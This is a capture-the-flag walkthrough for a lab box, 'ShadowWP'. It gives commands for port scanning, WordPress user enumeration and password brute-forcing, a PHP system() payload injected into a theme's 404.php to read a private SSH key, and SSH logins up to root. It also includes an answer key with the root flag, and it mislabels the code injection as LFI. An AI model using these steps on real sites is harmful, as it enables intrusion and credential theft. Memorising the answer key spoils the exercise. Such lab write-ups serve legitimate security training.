
# 🧠 ShadowWP – CTF Walkthrough  
**Difficulty:** Medium  
**Author:** MrgBells  
**Platform:** TryHackMe  
**Objective:** Gain root access through a chain of WordPress misconfigurations, weak credentials, and SSH key exploitation.

---

## 🛰️ Step 1 – Reconnaissance  
**Goal:** Discover open ports and services.

- Run full port scan:
  ```bash
  nmap -sV -sC -p- <target-ip>
  ```
- Expected output:
  - Port 22: SSH
  - Port 80: HTTP (WordPress site)

🧩 **Hint:** Look closely at port 80 for web enumeration.

---

## 🌐 Step 2 – Enumerate WordPress  
**Goal:** Discover valid WordPress usernames and passwords.

- Enumerate users:
  ```bash
  wpscan --url http://<target-ip> --enumerate u
  ```
- Brute-force the password:
  ```bash
  wpscan --url http://<target-ip> --username abel --passwords /usr/share/wordlists/rockyou.txt
  ```
- Login to WordPress dashboard:  
  [http://<target-ip>/wp-login.php](http://<target-ip>/wp-login.php)

🧩 **Hint:** After login, go to Appearance → Theme Editor → edit `404.php`.

---

## 📂 Step 3 – Exploit LFI to Steal SSH Key  
**Goal:** Read the low-privileged user’s private SSH key via file inclusion.

- Inject this code into `404.php` in the WordPress theme:
  ```php
  <?php system('cat /home/abel/.ssh/id_rsa'); ?>
  ```
- Visit:
  ```url
  http://<target-ip>/index.php?page_id=404
  ```
- Copy the key and save it as `id_rsa`:
  ```bash
  chmod 600 id_rsa
  ssh -i id_rsa abel@<target-ip>
  ```

🧩 **Hint:** Try default path `/home/abel/.ssh/id_rsa`.

---

## 🧾 Step 4 – Find the Passphrase  
**Goal:** Get the passphrase for the root key.

- Once logged in as `abel`, check the home directory:
  ```bash
  ls /home/abel
  cat flag.txt       # First user flag
  cat readme.txt     # Contains the root key passphrase
  ```

🧩 **Hint:** Save the passphrase for next step.

---

## 🔑 Step 5 – SSH as Root  
**Goal:** Use the root SSH key with the passphrase to log in.

- If accessible via LFI, extract `/root/.ssh/id_rsa` the same way.
- Save it as `id_rsa_root` and:
  ```bash
  chmod 600 id_rsa_root
  ssh -i id_rsa_root root@<target-ip>
  ```
- Enter the passphrase when prompted (from `readme.txt`).

🧩 **Hint:** If prompted for passphrase, use `ssh-add`:
  ```bash
  eval "$(ssh-agent)"
  ssh-add id_rsa_root
  ```

---

## 🏁 Step 6 – Capture the Root Flag  
**Goal:** Prove full system compromise.

- Once logged in as root:
  ```bash
  cat /root/root.txt
  ```

🎉 **Congratulations! You have rooted ShadowWP! 🎉**

---

## 🧩 Sample CTF Questions

1. **How many open ports are exposed on the box?**  
   ➤ *Answer: 2*

2. **How many `.txt` files are found in abel's home directory?**  
   ➤ *Answer: 2*

3. **What is the final root flag?**  
   ➤ *Answer: congratulations you have rooted mrgbells box*

---

## 🔁 Summary Table  

| Phase               | Goal                             | Tools/Commands                                |
|--------------------|----------------------------------|-----------------------------------------------|
| Recon              | Find open ports                  | `nmap -sV -sC -p-`                             |
| WordPress Enum     | Find user + password             | `wpscan`                                       |
| LFI Exploit        | Steal SSH key                    | PHP payload in `404.php`                      |
| Low Priv Access    | SSH into server                  | `ssh -i id_rsa abel@<ip>`                     |
| Priv Escalation    | Read passphrase + use root key   | `ssh -i id_rsa_root root@<ip>`                |
| Root Flag          | Get final flag                   | `cat /root/root.txt`                          |

---

> 💡 **Note:** Always follow ethical hacking practices. This lab is for educational purposes only.
